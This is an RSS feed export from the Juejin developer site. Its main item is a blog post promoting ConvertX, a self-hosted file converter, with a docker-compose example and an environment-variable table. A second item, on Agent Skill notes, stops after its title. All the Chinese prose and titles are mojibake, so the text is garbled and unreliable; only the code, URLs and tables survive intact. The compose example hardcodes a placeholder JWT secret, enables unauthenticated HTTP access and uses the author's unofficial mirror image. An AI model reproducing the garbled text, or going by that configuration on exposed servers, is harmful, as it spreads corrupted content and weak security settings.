<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>æ˜é‡‘æ–‡ç« æ¨è</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>ä¸€ä¸ªå¸®åŠ©å¼€å‘è€…æˆé•¿çš„ç¤¾åŒº</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[ConvertX:ä¸€ç«™å¼è‡ªæ‰˜ç®¡åœ¨çº¿æ–‡ä»¶è½¬æ¢å¹³å°,æ”¯æŒä¸Šåƒç§æ ¼å¼]]></title>    <link>https://juejin.cn/post/7597283981185302580</link>    <guid>https://juejin.cn/post/7597283981185302580</guid>    <pubDate>2026-01-20T15:27:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597283981185302580" data-draft-id="7597326073671696399" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ConvertX:ä¸€ç«™å¼è‡ªæ‰˜ç®¡åœ¨çº¿æ–‡ä»¶è½¬æ¢å¹³å°,æ”¯æŒä¸Šåƒç§æ ¼å¼"/> <meta itemprop="keywords" content="å¼€æº"/> <meta itemprop="datePublished" content="2026-01-20T15:27:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¿®å·±xj"/> <meta itemprop="url" content="https://juejin.cn/user/2641475936724142"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ConvertX:ä¸€ç«™å¼è‡ªæ‰˜ç®¡åœ¨çº¿æ–‡ä»¶è½¬æ¢å¹³å°,æ”¯æŒä¸Šåƒç§æ ¼å¼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2641475936724142/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¿®å·±xj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T15:27:48.000Z" title="Tue Jan 20 2026 15:27:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä½ æ˜¯å¦æ›¾ç»ä¸ºäº†è½¬æ¢ä¸€ä¸ªæ–‡ä»¶æ ¼å¼ï¼Œåœ¨ç”µè„‘ä¸Šå®‰è£…å„ç§è‡ƒè‚¿çš„è½¯ä»¶ï¼Œæˆ–è€…å°†æ•æ„Ÿæ–‡ä»¶ä¸Šä¼ åˆ°ç¬¬ä¸‰æ–¹åœ¨çº¿è½¬æ¢ç½‘ç«™ï¼Ÿå¦‚æœä½ æ­£åœ¨å¯»æ‰¾ä¸€ä¸ªæ—¢èƒ½ä¿æŠ¤éšç§ã€åˆèƒ½æ»¡è¶³å¤šæ ·åŒ–è½¬æ¢éœ€æ±‚çš„è‡ªæ‰˜ç®¡è§£å†³æ–¹æ¡ˆï¼Œé‚£ä¹ˆ <strong>ConvertX</strong> å°±æ˜¯ä¸ºä½ é‡èº«æ‰“é€ çš„å·¥å…·ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/15f6b2448cc9445f9d75f3b7a3f5422c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527667&amp;x-signature=lL6fsv%2F5SE66WalF0UHKsf9psT8%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">ğŸ’¥ä»€ä¹ˆæ˜¯ ConvertXï¼Ÿ</h2>
<p>ConvertX æ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„è‡ªæ‰˜ç®¡åœ¨çº¿æ–‡ä»¶è½¬æ¢å™¨ã€‚å®ƒæœ€å¤§çš„äº®ç‚¹æ˜¯ <strong>æ”¯æŒè¶…è¿‡ä¸€åƒç§ä¸åŒçš„æ–‡ä»¶æ ¼å¼è½¬æ¢</strong>ï¼Œæ¶µç›–äº†æ–‡æ¡£ã€å›¾åƒã€è§†é¢‘ã€ç”µå­ä¹¦ã€3Dæ¨¡å‹ç­‰å¤šç§ç±»å‹ã€‚è¯¥é¡¹ç›®é‡‡ç”¨ TypeScriptã€Bun å’Œ Elysia ç­‰ç°ä»£æŠ€æœ¯æ ˆå¼€å‘ï¼Œæ—¨åœ¨ä¸ºç”¨æˆ·æä¾›ä¸€ä¸ªå®‰å…¨ã€é«˜æ•ˆã€å¯å®Œå…¨æŒæ§çš„æœ¬åœ°åŒ–æ–‡ä»¶å¤„ç†ä¸­å¿ƒã€‚</p>
<p>githubåœ°å€ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FC4illin%2FConvertX" target="_blank" title="https://github.com/C4illin/ConvertX" ref="nofollow noopener noreferrer">github.com/C4illin/Conâ€¦</a></p>
<p>è¯¥é¡¹ç›®åœ¨github å·²æœ‰15.3k â­star</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cd5050a58bae45e2b6d5def2beb1f798~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527667&amp;x-signature=%2F6IX8CnFDJs6nnPqDKgI%2Bi%2BtU%2F0%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">â˜€ï¸ æ ¸å¿ƒç‰¹æ€§</h2>
<ul>
<li><strong>æµ·é‡æ ¼å¼æ”¯æŒï¼š</strong> æ”¯æŒä¸Šåƒç§æ ¼å¼äº’è½¬ï¼Œå‡ ä¹èƒ½æ»¡è¶³æ‰€æœ‰æ—¥å¸¸åŠä¸“ä¸šéœ€æ±‚ã€‚</li>
<li><strong>æ‰¹é‡å¤„ç†ï¼š</strong> å¯ä»¥ä¸€æ¬¡æ€§ä¸Šä¼ å¹¶è½¬æ¢å¤šä¸ªæ–‡ä»¶ï¼Œæ˜¾è‘—æå‡å·¥ä½œæ•ˆç‡ã€‚</li>
<li><strong>éšç§å®‰å…¨ï¼š</strong> è‡ªæ‰˜ç®¡æ„å‘³ç€ä½ çš„æ–‡ä»¶æ•°æ®æ°¸è¿œä¸ä¼šç¦»å¼€ä½ è‡ªå·±çš„æœåŠ¡å™¨ï¼Œéå¸¸é€‚åˆå¤„ç†æ•æ„Ÿæˆ–æœºå¯†æ–‡æ¡£ã€‚</li>
<li><strong>å¤šç”¨æˆ·è´¦æˆ·ï¼š</strong> æ”¯æŒä¸ºå›¢é˜Ÿæˆå‘˜æˆ–å®¶åº­æˆå‘˜åˆ›å»ºç‹¬ç«‹çš„è´¦æˆ·ï¼Œå…±äº«æœåŠ¡åˆä¿æŒä¸ªäººæ–‡ä»¶å†å²éš”ç¦»ã€‚</li>
<li><strong>å¼€æºå…è´¹ï¼š</strong> å®Œå…¨å¼€æºï¼Œä»£ç é€æ˜ï¼Œå¯è‡ªç”±éƒ¨ç½²å’Œä¿®æ”¹ã€‚</li>
</ul>
<h2 data-id="heading-2">ğŸ å¼ºå¤§çš„è½¬æ¢å¼•æ“é˜µå®¹</h2>
<p>ConvertX çš„å¼ºå¤§èƒ½åŠ›æºäºå…¶èƒŒåæ•´åˆçš„ä¼—å¤šä¸šç•ŒçŸ¥åçš„å¼€æºè½¬æ¢å·¥å…·ï¼Œå®ƒä»¬å…±åŒæ„æˆäº†ä¸€ä¸ªè¶…çº§è½¬æ¢å·¥å‚ï¼š</p>

































































<table><thead><tr><th>å·¥å…·</th><th>ç”¨é€”</th><th>æ”¯æŒè¾“å…¥æ ¼å¼æ•°</th><th>æ”¯æŒè¾“å‡ºæ ¼å¼æ•°</th></tr></thead><tbody><tr><td><strong>FFmpeg</strong></td><td>éŸ³è§†é¢‘å¤„ç†</td><td>~472ç§</td><td>~199ç§</td></tr><tr><td><strong>ImageMagick / GraphicsMagick</strong></td><td>å›¾åƒå¤„ç†</td><td>412ç§</td><td>313ç§</td></tr><tr><td><strong>LibreOffice</strong></td><td>åŠå…¬æ–‡æ¡£</td><td>41ç§</td><td>22ç§</td></tr><tr><td><strong>Pandoc</strong></td><td>æ–‡æ¡£æ ¼å¼ï¼ˆå¦‚Markdownï¼‰</td><td>43ç§</td><td>65ç§</td></tr><tr><td><strong>Calibre</strong></td><td>ç”µå­ä¹¦</td><td>26ç§</td><td>19ç§</td></tr><tr><td><strong>Inkscape</strong></td><td>çŸ¢é‡å›¾å½¢</td><td>7ç§</td><td>17ç§</td></tr><tr><td><strong>Assimp</strong></td><td>3Dæ¨¡å‹èµ„äº§</td><td>77ç§</td><td>23ç§</td></tr><tr><td><strong>Vips / libheif / libjxl</strong></td><td>é«˜æ€§èƒ½å›¾åƒä¸HEIF/JPEG XLæ ¼å¼</td><td>58ç§</td><td>38ç§</td></tr><tr><td>... ä»¥åŠæ›´å¤š</td><td>åŒ…æ‹¬ SVGã€LaTeXã€Outlooké‚®ä»¶ã€è”ç³»äººæ–‡ä»¶ç­‰</td><td/><td/></tr></tbody></table>
<p>è¿™ä¸ªåˆ—è¡¨æ¸…æ™°åœ°å±•ç¤ºäº† ConvertX çš„æ ¼å¼è¦†ç›–å¹¿åº¦ã€‚æ— è®ºæ˜¯å¸¸è§çš„ <code>.pdf</code>ã€<code>.docx</code>ã€<code>.mp4</code>ã€<code>.jpg</code>ï¼Œè¿˜æ˜¯ç›¸å¯¹å°ä¼—çš„æ ¼å¼ï¼Œå®ƒéƒ½æœ‰å¾ˆå¤§å¯èƒ½æ”¯æŒã€‚</p>
<h2 data-id="heading-3">ğŸï¸å¿«é€Ÿéƒ¨ç½²æŒ‡å—</h2>
<p>ä½¿ç”¨ Docker éƒ¨ç½² ConvertX æ˜¯æå…¶ç®€å•çš„è¿‡ç¨‹ï¼Œåªéœ€å‡ åˆ†é’Ÿå³å¯æ‹¥æœ‰è‡ªå·±çš„è½¬æ¢æœåŠ¡ã€‚</p>
<ol>
<li><strong>å‡†å¤‡ <code>docker-compose.yml</code> æ–‡ä»¶ï¼š</strong></li>
</ol>

<pre><code class="hljs language-ini" lang="ini">services:
  convertx:
  <span class="hljs-comment"># æ­¤æœåŠ¡çš„é•œåƒ3.59GBï¼Œå›½å†…ä¸‹è½½æ¯”è¾ƒæ…¢ï¼Œéœ€è¦çš„å®¶äººä»¬å¯ä»¥ä½¿ç”¨æˆ‘è½¬å­˜é˜¿é‡Œäº‘é•œåƒä»“åº“çš„é•œåƒ</span>
    image: registry.cn-hangzhou.aliyuncs.com/xjpublic/convertx
    container_name: convertx
    restart: unless-stopped
    ports:
      - "10000:3000"
    environment: 
      - <span class="hljs-attr">ACCOUNT_REGISTRATION</span>=<span class="hljs-literal">false</span> <span class="hljs-comment"># trueæˆ–falseï¼Œé¦–è´¦æˆ·åˆ›å»ºä¸å—å½±å“ï¼ˆä¾‹å¦‚è‹¥åªéœ€å•è´¦æˆ·å¯ä¿æŒfalseï¼‰</span>
      - <span class="hljs-attr">JWT_SECRET</span>=aLongAndSecretStringUsedToSignTheJSONWebToken1234 <span class="hljs-comment"># é»˜è®¤ä½¿ç”¨randomUUID()ç”Ÿæˆ</span>
      - <span class="hljs-attr">HTTP_ALLOWED</span>=<span class="hljs-literal">true</span> <span class="hljs-comment"># è‹¥è¦ä½¿ç”¨httpè®¿é—®ï¼Œåˆ™è®¾ç½®ä¸ºtrue</span>
      - <span class="hljs-attr">ALLOW_UNAUTHENTICATED</span>=<span class="hljs-literal">true</span>  <span class="hljs-comment"># å…è®¸æœªç™»å½•ç”¨æˆ·ä½¿ç”¨æœåŠ¡ï¼Œä»…é™æœ¬åœ°ç¯å¢ƒè®¾ä¸ºtrue</span>
      - <span class="hljs-attr">AUTO_DELETE_EVERY_N_HOURS</span>=<span class="hljs-number">24</span> <span class="hljs-comment"># æ¯Nå°æ—¶æ£€æŸ¥å¹¶åˆ é™¤è¶…è¿‡Nå°æ—¶çš„æ—§æ–‡ä»¶ï¼Œè®¾ä¸º0å¯ç¦ç”¨</span>
    volumes:
      - ./data:/app/data
</code></pre>
<p>ğŸ³<strong>Docker é•œåƒ</strong></p>
<p>æ¯æ¬¡å‘å¸ƒæ—¶ä¼šæ›´æ–° <code>:latest</code> æ ‡ç­¾ï¼Œæ¯æ¬¡æ¨é€åˆ°ä¸»åˆ†æ”¯æ—¶ä¼šæ›´æ–° <code>:main</code> æ ‡ç­¾ã€‚å¸¸è§„ä½¿ç”¨æ¨èä½¿ç”¨ <code>:latest</code> æ ‡ç­¾ã€‚</p>
<p>é•œåƒå¯åœ¨ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FC4illin%2FConvertX%2Fpkgs%2Fcontainer%2FConvertX" target="_blank" title="https://github.com/C4illin/ConvertX/pkgs/container/ConvertX" ref="nofollow noopener noreferrer">GitHub Container Registry</a> å’Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Fhub.docker.com%2Fr%2Fc4illin%2Fconvertx" target="_blank" title="https://hub.docker.com/r/c4illin/convertx" ref="nofollow noopener noreferrer">Docker Hub</a> è·å–ã€‚</p>

























<table><thead><tr><th>é•œåƒ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>image: ghcr.io/c4illin/convertx</code></td><td>GitHub Container Registry ä¸Šçš„æœ€æ–°å‘å¸ƒç‰ˆæœ¬</td></tr><tr><td><code>image: ghcr.io/c4illin/convertx:main</code></td><td>GitHub Container Registry ä¸Šçš„æœ€æ–°æäº¤</td></tr><tr><td><code>image: c4illin/convertx</code></td><td>Docker Hub ä¸Šçš„æœ€æ–°å‘å¸ƒç‰ˆæœ¬</td></tr><tr><td><code>image: c4illin/convertx:main</code></td><td>Docker Hub ä¸Šçš„æœ€æ–°æäº¤</td></tr></tbody></table>
<p>æ­¤æœåŠ¡çš„é•œåƒ3.59GBï¼Œå›½å†…ä¸‹è½½æ¯”è¾ƒæ…¢ï¼Œéœ€è¦çš„å®¶äººä»¬å¯ä»¥ä½¿ç”¨æˆ‘è½¬å­˜é˜¿é‡Œäº‘é•œåƒä»“åº“çš„é•œåƒ<code>registry.cn-hangzhou.aliyuncs.com/xjpublic/convertx</code></p>
<ol start="2">
<li>
<p><strong>å¯åŠ¨æœåŠ¡ï¼š</strong></p>
<p>åœ¨ <code>docker-compose.yml</code> æ–‡ä»¶æ‰€åœ¨ç›®å½•ä¸‹è¿è¡Œï¼š</p>
</li>
</ol>

<pre><code class="hljs">docker-compose up -d
</code></pre>
<p>3.  <strong>åˆå§‹åŒ–è´¦æˆ·ï¼š</strong> åœ¨æµè§ˆå™¨ä¸­è®¿é—® <code>http://ä½ çš„æœåŠ¡å™¨IP:3000</code>ã€‚<strong>ç¬¬ä¸€ä¸ªæ³¨å†Œçš„ç”¨æˆ·å°†è‡ªåŠ¨æˆä¸ºç®¡ç†å‘˜</strong>ã€‚</p>
<p>å°±è¿™ä¹ˆç®€å•ï¼ä½ å·²ç»æˆåŠŸæ­å»ºäº†ä¸€ä¸ªåŠŸèƒ½å®Œå¤‡çš„åœ¨çº¿æ–‡ä»¶è½¬æ¢å¹³å°ã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea5e412ffef949c0b361cf4a406093d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527667&amp;x-signature=GGHqYDL9Q1atciNfvU7RE%2FWxW2A%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1e959a7762eb45e7bf30d155dc3f513e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527667&amp;x-signature=n5K9tEYwr%2FdvSY%2BM79RURKu%2BsRQ%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-4">ğŸ›ç¯å¢ƒå˜é‡</h3>
<p>æ‰€æœ‰å˜é‡å‡ä¸ºå¯é€‰ï¼Œä½†å»ºè®®è®¾ç½® JWT_SECRETã€‚</p>






































































<table><thead><tr><th>å˜é‡å</th><th>é»˜è®¤å€¼</th><th>æè¿°</th></tr></thead><tbody><tr><td>JWT_SECRET</td><td>æœªè®¾ç½®æ—¶ä½¿ç”¨ randomUUID() ç”Ÿæˆçš„å€¼</td><td>ç”¨äºç­¾å JSON Web Token çš„é•¿è€Œä¿å¯†çš„å­—ç¬¦ä¸²</td></tr><tr><td>ACCOUNT_REGISTRATION</td><td>false</td><td>æ˜¯å¦å…è®¸ç”¨æˆ·æ³¨å†Œè´¦æˆ·</td></tr><tr><td>HTTP_ALLOWED</td><td>false</td><td>æ˜¯å¦å…è®¸ HTTP è¿æ¥ï¼Œä»…åœ¨æœ¬åœ°ç¯å¢ƒä¸­è®¾ç½®ä¸º true</td></tr><tr><td>ALLOW_UNAUTHENTICATED</td><td>false</td><td>æ˜¯å¦å…è®¸æœªè®¤è¯ç”¨æˆ·ä½¿ç”¨æœåŠ¡ï¼Œä»…åœ¨æœ¬åœ°ç¯å¢ƒä¸­è®¾ç½®ä¸º true</td></tr><tr><td>AUTO_DELETE_EVERY_N_HOURS</td><td>24</td><td>æ¯éš” n å°æ—¶æ£€æŸ¥å¹¶åˆ é™¤è¶…è¿‡ n å°æ—¶çš„æ–‡ä»¶ï¼Œè®¾ç½®ä¸º 0 ä»¥ç¦ç”¨</td></tr><tr><td>WEBROOT</td><td/><td>æ ¹è·¯å¾„åœ°å€ï¼Œä¾‹å¦‚è®¾ç½®ä¸º "/convert" åï¼Œç½‘ç«™å°†é€šè¿‡ "example.com/convert/" è®¿é—®</td></tr><tr><td>FFMPEG_ARGS</td><td/><td>ä¼ é€’ç»™ ffmpeg è¾“å…¥æ–‡ä»¶çš„å‚æ•°ï¼Œä¾‹å¦‚ <code>-hwaccel vaapi</code>ã€‚æœ‰å…³ç¡¬ä»¶åŠ é€Ÿçš„æ›´å¤šä¿¡æ¯ï¼Œè¯·å‚é˜… <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FC4illin%2FConvertX%2Fissues%2F190%25E3%2580%2582" target="_blank" title="https://github.com/C4illin/ConvertX/issues/190%E3%80%82" ref="nofollow noopener noreferrer">github.com/C4illin/Conâ€¦</a></td></tr><tr><td>FFMPEG_OUTPUT_ARGS</td><td/><td>ä¼ é€’ç»™ ffmpeg è¾“å‡ºæ–‡ä»¶çš„å‚æ•°ï¼Œä¾‹å¦‚ <code>-preset veryfast</code></td></tr><tr><td>HIDE_HISTORY</td><td>false</td><td>æ˜¯å¦éšè—å†å²è®°å½•é¡µé¢</td></tr><tr><td>LANGUAGE</td><td>en</td><td>ç”¨äºæ ¼å¼åŒ–æ—¥æœŸå­—ç¬¦ä¸²çš„è¯­è¨€ï¼Œéœ€ä½¿ç”¨ [BCP 47 è¯­è¨€æ ‡ç­¾] æŒ‡å®š</td></tr><tr><td>UNAUTHENTICATED_USER_SHARING</td><td>false</td><td>æ˜¯å¦åœ¨æ‰€æœ‰æœªè®¤è¯ç”¨æˆ·ä¹‹é—´å…±äº«è½¬æ¢å†å²è®°å½•</td></tr><tr><td>MAX_CONVERT_PROCESS</td><td>0</td><td>å…è®¸çš„æœ€å¤§å¹¶å‘è½¬æ¢è¿›ç¨‹æ•°ã€‚è®¾ç½®ä¸º 0 è¡¨ç¤ºæ— é™åˆ¶ã€‚</td></tr></tbody></table>
<h2 data-id="heading-5">ğŸŒ…æ€»ç»“</h2>
<p><strong>ConvertX å®Œç¾åœ°è§£å†³äº†ä¸€ä¸ªæ ¸å¿ƒç—›ç‚¹ï¼šåœ¨ä¿éšœæ•°æ®éšç§çš„å‰æä¸‹ï¼Œæä¾›å ªæ¯”ç”šè‡³è¶…è¶Šå•†ä¸šäº‘æœåŠ¡çš„æ–‡ä»¶æ ¼å¼è½¬æ¢èƒ½åŠ›ã€‚</strong> æ— è®ºä½ æ˜¯ä¸ªäººç”¨æˆ·ï¼Œæƒ³è¦ä¸€ä¸ªå¹²å‡€ã€æ— å¹¿å‘Šã€ä¸é™æ¬¡æ•°çš„æœ¬åœ°è½¬æ¢å·¥å…·ï¼›è¿˜æ˜¯å›¢é˜Ÿæˆ–ç»„ç»‡ï¼Œéœ€è¦åœ¨å†…ç½‘éƒ¨ç½²ä¸€ä¸ªå®‰å…¨çš„æ–‡ä»¶å¤„ç†æœåŠ¡ï¼ŒConvertX éƒ½æ˜¯ä¸€ä¸ªæå…·å¸å¼•åŠ›çš„é€‰æ‹©ã€‚</p>
<p>å…¶åŸºäº Docker çš„ä¸€é”®å¼éƒ¨ç½²ã€è¯¦å°½çš„é…ç½®é€‰é¡¹å’Œæ´»è·ƒçš„å¼€æºç”Ÿæ€ï¼Œä½¿å¾—ä»è¯•ç”¨ã€éƒ¨ç½²åˆ°é•¿æœŸç»´æŠ¤éƒ½å˜å¾—éå¸¸è½»æ¾ã€‚å¦‚æœä½ åŒå€¦äº†åœ¨å¤šä¸ªåœ¨çº¿è½¬æ¢ç½‘ç«™é—´è·³è½¬ï¼Œæˆ–æ˜¯å¯¹äº‘æœåŠ¡çš„æ•°æ®å®‰å…¨å¿ƒå­˜é¡¾è™‘ï¼Œä¸å¦¨ç°åœ¨å°±å°è¯•éƒ¨ç½²ä¸€ä¸ªå±äºä½ è‡ªå·±çš„ ConvertXã€‚</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1d73106e49464640808061ad601a1975~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769527667&amp;x-signature=EcJVtGJWS5pP1yYFOojreSlynl0%3D" alt="" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Agent Skill å­¦ä¹ ç¬”è®°]]></title>    <link>https://juejin.cn/post/7597278451029786634</link>    <guid>https://juejin.cn/post/7597278451029786634</guid>    <pubDate>2026-01-20T15:27:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597278451029786634" data-draft-id="7597266141912694830" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Agent Skill å­¦ä¹ ç¬”è®°"/> <meta itemprop="keywords" content="ç¨‹åºå‘˜"/> <meta itemprop="datePublished" content="2026-01-20T15:27:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="KaneLogger"/> <meta itemprop="url" content="https://juejin.cn/user/3650034333917031"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Agent Skill å­¦ä¹ ç¬”è®°
